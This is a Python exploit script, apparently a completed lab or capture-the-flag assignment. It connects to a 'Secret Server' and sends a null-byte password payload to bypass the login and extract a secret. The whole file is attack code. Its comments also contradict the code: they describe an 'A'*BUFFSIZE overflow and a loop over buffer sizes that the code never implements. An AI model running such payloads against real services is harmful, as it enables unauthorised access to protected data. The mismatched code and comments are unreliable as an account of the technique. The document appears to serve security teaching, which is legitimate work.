import argparse
import socket
import sys
import time

# implement this function
# add additional helper functions/classes if you need
def run_exploit(hostname, port):
    secret_prefix = "The secret is: "
    timeout = 3  # seconds

    try:
        # Establish a connection to the server
        with socket.create_connection((hostname, port), timeout=timeout) as sock:
            # Receive initial messages from the server
            response = sock.recv(1024).decode()
            # Check if the server sent the initial prompt
            if "Secret Server" not in response:
                return "Unexpected response"

            # Read "Password:" prompt
            response += sock.recv(1024).decode()

            # Construct the payload: 'A'*BUFFSIZE + 'newpass' + '\x00' + '\n'
            payload = "newpass\0newpass\n"

            # Send the payload
            sock.sendall(payload.encode())

            # Receive the server's response
            response = sock.recv(1024).decode()

            # Check if the secret is revealed
            if secret_prefix in response:
                # Extract the secret
                secret = response.split(secret_prefix)[1].strip()
                return secret

    except (socket.timeout, ConnectionRefusedError, socket.error):
        return "connection fails or times out"

    # If exploit fails for all BUFFSIZE values
    return "Failed to retrieve the secret."

# =================================================================
# Do not modify any lines below
# =================================================================

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("hostname", help="hostname or IP address")
    parser.add_argument("port", help="port number", type=int)
    args = parser.parse_args()
    print(f"Running exploit on {args.hostname}:{args.port}")
    secret = run_exploit(args.hostname, args.port)
    print(f"Secret = {secret}")

if __name__ == "__main__":
    main()
    